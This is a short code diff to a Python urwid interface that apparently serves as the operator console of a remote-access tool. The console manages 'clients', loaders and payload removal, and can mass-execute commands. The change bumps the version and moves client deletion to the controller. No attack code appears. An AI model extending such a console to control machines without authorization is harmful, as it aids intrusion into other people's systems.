@@ -3,7 +3,7 @@
 """Interacts with the user via urwid."""
 __author__ = "Marten4n6"
 __license__ = "GPLv3"
-__version__ = "2.1.3"
+__version__ = "2.1.4"
 
 from model import *
 from module_factory import ModuleFactory
@@ -396,6 +396,8 @@ class View(urwid.Frame):
             loader = self._loader_factory.get_loaders()[loader_name]
 
             if module_name == "remove_client":
+                # Note: The controller will remove the client from the database.
+
                 if mass_execute:
                     clients = self._model.get_clients()
 
@@ -409,7 +411,6 @@ class View(urwid.Frame):
                         ))
 
                     if self._current_client in clients:
-                        self._model.remove_client(self._current_client.id)
                         self.process_command("quit")
                 else:
                     self.output_view.add("Removing the client using the \"%s\" loader..." % loader_name, "info")
@@ -418,7 +419,6 @@ class View(urwid.Frame):
                         self._current_client.id, base64.b64encode(loader.remove_payload()), "remove_client"
                     ))
 
-                    self._model.remove_client(self._current_client.id)
                     self.process_command("quit")
             elif module_name == "update_client":
                 self.output_view.add(
